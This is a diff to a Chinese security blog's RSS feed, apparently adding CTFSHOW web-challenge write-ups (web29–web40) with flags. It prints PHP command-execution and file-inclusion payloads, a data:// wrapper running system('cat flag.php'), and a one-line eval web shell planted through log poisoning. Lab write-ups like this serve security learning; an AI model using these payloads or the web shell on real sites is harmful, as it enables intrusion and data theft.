@@ -7,12 +7,12 @@
         <language>zh-CN</language>
         <pubDate>Fri, 23 Jul 2021 17:39:00 +0800</pubDate>
         <lastBuildDate>Fri, 23 Jul 2021 17:39:00 +0800</lastBuildDate>
-        <category>数据库</category>
-        <category>免杀</category>
-        <category>渗透测试</category>
-        <category>web安全</category>
         <category>CTF</category>
         <category>靶场练习</category>
+        <category>web安全</category>
+        <category>免杀</category>
+        <category>渗透测试</category>
+        <category>数据库</category>
         <category>C++</category>
         <category>内网渗透</category>
         <category>代码审计</category>
@@ -21,9 +21,9 @@
             <guid isPermalink="true">https://ch1e.gitee.io/2021/07/23/ctfshowweb/</guid>
             <title>CTFSHOW之WEB入门1000题</title>
             <link>https://ch1e.gitee.io/2021/07/23/ctfshowweb/</link>
-            <category>web安全</category>
             <category>CTF</category>
             <category>靶场练习</category>
+            <category>web安全</category>
             <pubDate>Fri, 23 Jul 2021 17:39:00 +0800</pubDate>
             <description><![CDATA[ &lt;h1 id=&#34;web1&#34;&gt;&lt;a href=&#34;#web1&#34; class=&#34;headerlink&#34; title=&#34;web1&#34;&gt;&lt;/a&gt;web1&lt;/h1&gt;&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210723101944875.png&#34; alt=&#34;image-20210723101944875&#34;&gt;&lt;/p&gt;
 &lt;p&gt;右键查看源代码就出来了&lt;/p&gt;
@@ -91,7 +91,7 @@
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ctfshow&amp;#123;42986bfd-0cba-43c6-9be4-1a319be86d20&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 
 &lt;h1 id=&#34;web15&#34;&gt;&lt;a href=&#34;#web15&#34; class=&#34;headerlink&#34; title=&#34;web15&#34;&gt;&lt;/a&gt;web15&lt;/h1&gt;&lt;p&gt;公开的信息比如邮箱，可能造成信息泄露，产生严重后果&lt;/p&gt;
-&lt;p&gt;可以看到有一个邮箱&lt;a href=&#34;mailto:&amp;#x31;&amp;#x31;&amp;#53;&amp;#x36;&amp;#x36;&amp;#x33;&amp;#49;&amp;#x39;&amp;#x36;&amp;#x31;&amp;#64;&amp;#x71;&amp;#x71;&amp;#46;&amp;#x63;&amp;#111;&amp;#109;&#34;&gt;&amp;#x31;&amp;#x31;&amp;#53;&amp;#x36;&amp;#x36;&amp;#x33;&amp;#49;&amp;#x39;&amp;#x36;&amp;#x31;&amp;#64;&amp;#x71;&amp;#x71;&amp;#46;&amp;#x63;&amp;#111;&amp;#109;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;可以看到有一个邮箱&lt;a href=&#34;mailto:&amp;#49;&amp;#x31;&amp;#53;&amp;#x36;&amp;#54;&amp;#x33;&amp;#49;&amp;#57;&amp;#x36;&amp;#49;&amp;#x40;&amp;#x71;&amp;#113;&amp;#46;&amp;#x63;&amp;#111;&amp;#x6d;&#34;&gt;&amp;#49;&amp;#x31;&amp;#53;&amp;#x36;&amp;#54;&amp;#x33;&amp;#49;&amp;#57;&amp;#x36;&amp;#49;&amp;#x40;&amp;#x71;&amp;#113;&amp;#46;&amp;#x63;&amp;#111;&amp;#x6d;&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;访问admin页面，admin作为账号 ，邮箱作为密码，发现不对&lt;/p&gt;
 &lt;p&gt;点忘记密码让我们填密保问题所在地  我们查一下这个qq，发现qq的资料显示在西安   之后密码被重置为admin7789，登陆即可&lt;/p&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ctfshow&amp;#123;dd71f776-6d6a-4cde-9106-f8db89f56b8d&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
@@ -151,31 +151,31 @@
 &lt;h1 id=&#34;web25&#34;&gt;&lt;a href=&#34;#web25&#34; class=&#34;headerlink&#34; title=&#34;web25&#34;&gt;&lt;/a&gt;web25&lt;/h1&gt;&lt;p&gt;太难了不会做&lt;/p&gt;
 &lt;h1 id=&#34;web26&#34;&gt;&lt;a href=&#34;#web26&#34; class=&#34;headerlink&#34; title=&#34;web26&#34;&gt;&lt;/a&gt;web26&lt;/h1&gt;&lt;p&gt;进来是一个安装系统，输入他指定的用户名和密码提示错误&lt;/p&gt;
 &lt;p&gt;这里打开Burpsuite爆破一波&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/ZwqGG/image/main/img/image-20210724105708564.png&#34; alt=&#34;image-20210724105708564&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210724105708564.png&#34; alt=&#34;image-20210724105708564&#34;&gt;&lt;/p&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ctfshow&amp;#123;3151a00a-f60a-4ae7-a58e-aabb46a8a613&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 
 &lt;h1 id=&#34;web27&#34;&gt;&lt;a href=&#34;#web27&#34; class=&#34;headerlink&#34; title=&#34;web27&#34;&gt;&lt;/a&gt;web27&lt;/h1&gt;&lt;p&gt;学生管理系统，有个录取名单和录取查询，但是身份证不完全&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/ZwqGG/image/main/img/image-20210724110956281.png&#34; alt=&#34;image-20210724110956281&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210724110956281.png&#34; alt=&#34;image-20210724110956281&#34;&gt;&lt;/p&gt;
 &lt;p&gt;我们这里可以写个php脚本，把他身份证可能的情况列出来&lt;/p&gt;
 &lt;p&gt;hint里已经准备好了，直接运行就可以得到字典了&lt;/p&gt;
 &lt;p&gt;抓包爆破，最后爆破出来身份证是621022199002015237&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/ZwqGG/image/main/img/image-20210724112423716.png&#34; alt=&#34;image-20210724112423716&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/ZwqGG/image/main/img/image-20210724111554978.png&#34; alt=&#34;image-20210724111554978&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210724112423716.png&#34; alt=&#34;image-20210724112423716&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210724111554978.png&#34; alt=&#34;image-20210724111554978&#34;&gt;&lt;/p&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ctfshow&amp;#123;8fca1cf2-e707-4ca8-9852-9884a85cbf89&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 
 &lt;h1 id=&#34;web28&#34;&gt;&lt;a href=&#34;#web28&#34; class=&#34;headerlink&#34; title=&#34;web28&#34;&gt;&lt;/a&gt;web28&lt;/h1&gt;&lt;p&gt;题目给了hint让我们爆破目录，我们使用Burpsuite试试&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/ZwqGG/image/main/img/image-20210724141407478.png&#34; alt=&#34;image-20210724141407478&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210724141407478.png&#34; alt=&#34;image-20210724141407478&#34;&gt;&lt;/p&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ctfshow&amp;#123;6ace4e13-0d2e-40e6-8a65-a8046fda3021&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 
 &lt;h1 id=&#34;web29&#34;&gt;&lt;a href=&#34;#web29&#34; class=&#34;headerlink&#34; title=&#34;web29&#34;&gt;&lt;/a&gt;web29&lt;/h1&gt;&lt;p&gt;命令执行的题了&lt;/p&gt;
 &lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;error_reporting(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;c&amp;#x27;&lt;/span&gt;]))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$c&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;c&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(!preg_match(&lt;span class=&#34;string&#34;&gt;&amp;quot;/flag/i&amp;quot;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$c&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$c&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    highlight_file(&lt;span class=&#34;keyword&#34;&gt;__FILE__&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125; &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 
 &lt;p&gt;正则匹配了flag，要绕过，执行phpinfo()看看，没有被禁用任何函数&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/ZwqGG/image/main/img/image-20210724141708438.png&#34; alt=&#34;image-20210724141708438&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210724141708438.png&#34; alt=&#34;image-20210724141708438&#34;&gt;&lt;/p&gt;
 &lt;p&gt;?c=system(‘ls’);  看到当前目录下又flag.php和index.php&lt;/p&gt;
 &lt;p&gt;不能直接cat flag.php  我们可以cat fla?.php&lt;/p&gt;
 &lt;p&gt;然后F12查看源代码，这题使用通配符绕过&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/ZwqGG/image/main/img/image-20210724141908498.png&#34; alt=&#34;image-20210724141908498&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210724141908498.png&#34; alt=&#34;image-20210724141908498&#34;&gt;&lt;/p&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ctfshow&amp;#123;d860244b-0743-4b12-8496-e40a869814d5&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 
 
@@ -199,14 +199,33 @@
 &lt;p&gt;Payload：&lt;/p&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?c=echo%09`tac%09*`;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 
-&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/ZwqGG/image/main/img/image-20210724145503686.png&#34; alt=&#34;image-20210724145503686&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210724145503686.png&#34; alt=&#34;image-20210724145503686&#34;&gt;&lt;/p&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ctfshow&amp;#123;c62494bf-4c4f-411a-b744-ba33d06b7ce1&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 
-&lt;h1 id=&#34;web32&#34;&gt;&lt;a href=&#34;#web32&#34; class=&#34;headerlink&#34; title=&#34;web32&#34;&gt;&lt;/a&gt;web32&lt;/h1&gt;&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(!preg_match(&lt;span class=&#34;string&#34;&gt;&amp;quot;/flag|system|php|cat|sort|shell|\.| |\&amp;#x27;|\`|echo|\;|\(/i&amp;quot;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$c&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h1 id=&#34;web32-web36&#34;&gt;&lt;a href=&#34;#web32-web36&#34; class=&#34;headerlink&#34; title=&#34;web32-web36&#34;&gt;&lt;/a&gt;web32-web36&lt;/h1&gt;&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(!preg_match(&lt;span class=&#34;string&#34;&gt;&amp;quot;/flag|system|php|cat|sort|shell|\.| |\&amp;#x27;|\`|echo|\;|\(/i&amp;quot;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$c&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 
 &lt;p&gt;这里过滤了太多东西了，分号过滤用?&amp;gt;绕过&lt;/p&gt;
 &lt;p&gt;Payload：&lt;/p&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?c=include%09$_GET[1]?&amp;gt;&amp;amp;1=php://filter/convert.base64-encode/resource=flag.php&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h1 id=&#34;web37&#34;&gt;&lt;a href=&#34;#web37&#34; class=&#34;headerlink&#34; title=&#34;web37&#34;&gt;&lt;/a&gt;web37&lt;/h1&gt;&lt;p&gt;hint提示查看源代码或者包含日志文件拿shell&lt;/p&gt;
+&lt;p&gt;我这里两种方法都写一下吧&lt;/p&gt;
+&lt;p&gt;直接查看源代码的话使用php伪协议&lt;/p&gt;
+&lt;p&gt;Payload1：/?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210724192337644.png&#34; alt=&#34;image-20210724192337644&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;web38&#34;&gt;&lt;a href=&#34;#web38&#34; class=&#34;headerlink&#34; title=&#34;web38&#34;&gt;&lt;/a&gt;web38&lt;/h1&gt;&lt;p&gt;先包含日志文件，可以观察到他会把我们GET传入的c的值写到日志文件里&lt;/p&gt;
+&lt;p&gt;这里我们就可以来把一句话作为我们的c写入，然后包含日志文件getshell&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php eval($_POST[a]); ?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/ZwqGG/image/main/img/image-20210724194408853.png&#34; alt=&#34;image-20210724194408853&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/ZwqGG/image/main/img/image-20210724194648944.png&#34; alt=&#34;image-20210724194648944&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;web39&#34;&gt;&lt;a href=&#34;#web39&#34; class=&#34;headerlink&#34; title=&#34;web39&#34;&gt;&lt;/a&gt;web39&lt;/h1&gt;&lt;p&gt;hint提示：data://text/plain, 这样就相当于执行了php语句 .php 因为前面的php语句已经闭合了，所以后面的.php会被当成html页面直接显示在页面上，起不到什么 作用&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;原语句：include($c.&amp;quot;.php&amp;quot;); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;构造的Payload：?c=data://text/plain,&amp;lt;?php system(&amp;#x27;cat fla?.php&amp;#x27;);?&amp;gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;拼接以后：include(data://text/plain,&amp;lt;?php system(&amp;#x27;cat fla?.php&amp;#x27;);?&amp;gt;.&amp;quot;.php&amp;quot;); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;因为语句已经闭合了，后面.php就相当文字直接输出&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/ZwqGG/image/main/img/image-20210724200022671.png&#34; alt=&#34;image-20210724200022671&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;web40&#34;&gt;&lt;a href=&#34;#web40&#34; class=&#34;headerlink&#34; title=&#34;web40&#34;&gt;&lt;/a&gt;web40&lt;/h1&gt;&lt;p&gt;这里直接先上payload，还没研究好&lt;/p&gt;
+&lt;p&gt;Payload：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;/?c=highlight_file(next(array_reverse(scandir(pos(localeconv())))));&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 
  ]]></description>
         </item>
@@ -214,9 +233,9 @@
             <guid isPermalink="true">https://ch1e.gitee.io/2021/07/22/ctfshow/</guid>
             <title>CTFSHOW题目练习</title>
             <link>https://ch1e.gitee.io/2021/07/22/ctfshow/</link>
-            <category>web安全</category>
             <category>CTF</category>
             <category>靶场练习</category>
+            <category>web安全</category>
             <pubDate>Thu, 22 Jul 2021 12:01:41 +0800</pubDate>
             <description><![CDATA[ &lt;h1 id=&#34;ctfshow刷题记录&#34;&gt;&lt;a href=&#34;#ctfshow刷题记录&#34; class=&#34;headerlink&#34; title=&#34;ctfshow刷题记录&#34;&gt;&lt;/a&gt;ctfshow刷题记录&lt;/h1&gt;&lt;h2 id=&#34;WEB&#34;&gt;&lt;a href=&#34;#WEB&#34; class=&#34;headerlink&#34; title=&#34;WEB&#34;&gt;&lt;/a&gt;WEB&lt;/h2&gt;&lt;h3 id=&#34;web签到题&#34;&gt;&lt;a href=&#34;#web签到题&#34; class=&#34;headerlink&#34; title=&#34;web签到题&#34;&gt;&lt;/a&gt;web签到题&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210722120341702.png&#34; alt=&#34;image-20210722120341702&#34;&gt;&lt;/p&gt;
 &lt;p&gt;右键查看源代码&lt;/p&gt;
@@ -361,9 +380,9 @@
             <guid isPermalink="true">https://ch1e.gitee.io/2021/07/14/BUUCTF/</guid>
             <title>BUU题目练习</title>
             <link>https://ch1e.gitee.io/2021/07/14/BUUCTF/</link>
-            <category>web安全</category>
             <category>CTF</category>
             <category>靶场练习</category>
+            <category>web安全</category>
             <pubDate>Wed, 14 Jul 2021 18:05:03 +0800</pubDate>
             <description><![CDATA[ &lt;h1 id=&#34;极客大挑战-2019-RCE-ME&#34;&gt;&lt;a href=&#34;#极客大挑战-2019-RCE-ME&#34; class=&#34;headerlink&#34; title=&#34;[极客大挑战 2019]RCE ME&#34;&gt;&lt;/a&gt;[极客大挑战 2019]RCE ME&lt;/h1&gt;&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;error_reporting(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;code&amp;#x27;&lt;/span&gt;]))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;         &lt;span class=&#34;variable&#34;&gt;$code&lt;/span&gt;=&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;code&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(strlen(&lt;span class=&#34;variable&#34;&gt;$code&lt;/span&gt;)&amp;gt;&lt;span class=&#34;number&#34;&gt;40&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                     &lt;span 